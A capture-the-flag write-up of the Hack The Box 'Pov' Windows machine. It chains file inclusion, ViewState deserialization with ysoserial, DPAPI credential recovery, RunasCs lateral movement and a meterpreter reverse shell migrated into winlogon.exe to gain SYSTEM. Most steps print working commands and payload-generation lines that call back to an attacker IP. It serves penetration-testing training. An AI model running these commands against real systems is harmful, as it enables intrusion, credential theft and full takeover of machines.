Summary
#

Pov is a medium-difficulty Windows machine that begins with the enumeration of a static website, leading to the discovery of the dev.pov.htb subdomain. A vulnerable file download functionality allows a Local File Inclusion (LFI), exposing the application’s web.config file and its ViewState encryption and validation keys. These secrets are leveraged to craft a malicious ViewState payload, resulting in .NET deserialization and remote code execution as the sfitz user. Further enumeration reveals a serialized PowerShell credential file containing the credentials of alaading, enabling lateral movement. Finally, the SeDebugPrivilege assigned to alaading is abused to migrate into a SYSTEM process, achieving NT AUTHORITY\SYSTEM privileges.

Discovering the Local File Inclusion
#

The new website appears to be a personal portfolio as navigating to it redirects us to “/portfolio” directory. There is an option to download a CV of the website owner which shows the following:

Inspecting the HTTP request reveals several POST parameters. The file parameter is particularly interesting because it directly specifies the file to be downloaded.

We can send the request to Repeater tab and try the LFI payload for Windows’ hosts file

Trying to retrieve the hosts file results in an error so maybe the code file handling the downloads has some restrictions. The website is being hosted on Windows IIS server and we can check for web.config if it is accessible via LFI:

From the contents of web.config, we can see that the application uses encrypted and validated ViewState. ViewState is a Microsoft ASP.NET feature that preserves the state of a page and its controls between requests by storing serialized data in a hidden form field.

The exposed web.config file also reveals the application’s ViewState encryption and validation keys. Since these cryptographic keys are now known, it is possible to generate a malicious ViewState payload that passes the application’s integrity checks, ultimately leading to .NET deserialization and remote code execution.

Exploiting ViewState Deserialization
#

To exploit this, we can use ysoserial.exe, which can be downloaded here. The tool is used to generate a malicious serialized ViewState payload that executes an arbitrary command on the target. In this case, we will use a Base64-encoded PowerShell reverse shell generated from revshells.com (PowerShell #3) and supply it to ysoserial.exe using the following command:

.\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="<DecryptionKey>" --validationalg="SHA1" --validationkey="ValidationKey" --path="/portfolio" -c "<PowerShell-Payload>"

After the payload is generated, open a netcat listener:

rlwrap nc -lvnp <Port>

Then copy the generated payload and replace with the value of __VIEWSTATE in the HTTP request. After sending the request, we can see in the netcat terminal that the reverse shell connection is received.

Lateral Movement to alaading
#

In the Documents folder of sfitz, we find a connection.xml with following content:

<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>

The file contains a serialized PowerShell PSCredential object created using the Export-Clixml cmdlet. While the username (alaading) is stored in plaintext, the password is encrypted as a SecureString using the Windows Data Protection API (DPAPI). Since DPAPI encrypts data using keys tied to both the user account and the local machine, the encrypted password cannot be decrypted offline or from a different system. However, because we have access to the same user context on the machine where the file was created, we can simply import the credential object using PowerShell and recover the plaintext password with the following commands:

PS C:\Users\sfitz> $cred = Import-Clixml C:\Users\sfitz\Documents\connection.xml
PS C:\Users\sfitz> $cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3

The plaintext password is revealed. Using the recovered credentials, we can obtain a reverse shell as alaading with RunasCs. The official compiled binary can be downloaded from link.

Transfer the RunasCs.exe binary to the Windows target by opening a python HTTP server on attacker machine with:

└─$ python3 -m http.server 8090

Then use curl on the target system:

PS C:\Users\sfitz> curl http://10.10.14.66:8090/RunasCs.exe -o RunasCs.exe

To get the reverse shell, open another netcat listener on any available port and use the tool with command:

PS C:\Users\sfitz> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r <Attacker-IP>:<Port>

After getting shell as alaading, we can find the user.txt in the Desktop folder

Escalating Privileges
#

Enumerating User Privileges
#

Checking the privileges of the user with “whoami /priv” revealed that alaading has SeDebugPrivilege.

PS C:\Users\alaading> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

This privilege effectively allows a process to attach to, inspect, and modify the memory and internal states of other processes even those owned by higher-level accounts like NT AUTHORITY\SYSTEM.

#

Process Migration to SYSTEM
#

Another technique is to attach a running process to another process. We can do it to migrate from our current low privileges process to some process that is running under the context of NT AUTHORITY\SYSTEM. The easiest way to do so is by using Metasploit’s meterpreter shell. Meterpreter provides a convenient process migration feature, making this technique significantly easier.

To generate a payload for the target Windows system:

└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.66 \   
LPORT=5000 \
--platform Windows \
-a x64 \
-f exe \
-o revShell.exe
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: revShell.exe

Replace the IP and port according to your system. Then open the listener with:

└─$ msfconsole -q -x "use exploit/multi/handler; \
set payload windows/x64/meterpreter/reverse_tcp; \
set lhost 0.0.0.0; \
set lport 5000; \
exploit;"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 0.0.0.0
lport => 5000
[*] Started reverse TCP handler on 0.0.0.0:5000

Now we just need to transfer the revShell.exe payload to the target and execute it using alaading:

PS C:\Users\alaading> .\revShell.exe

If we then look back in the Metasploit’s listener, we can see we have gained the shell as alaading

To migrate to a target process we need to find its Process ID (PID). The winlogon.exe process runs under the NT AUTHORITY\SYSTEM security context, making it a suitable migration target. We can find its PID with “ps winlogon.exe”

meterpreter > ps winlogon.exe
Filtering on 'winlogon.exe'

Process List
============

 PID  PPID  Name          Arch  Session  User                 Path
 ---  ----  ----          ----  -------  ----                 ----
 556  480   winlogon.exe  x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe

To migrate to it:

meterpreter > migrate 556
[*] Migrating from 3912 to 556...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

After migrating successfully, our Meterpreter session now executes as NT AUTHORITY\SYSTEM, giving us full control over the target. Now we can read the flag which is present in the Desktop folder of Administrator.
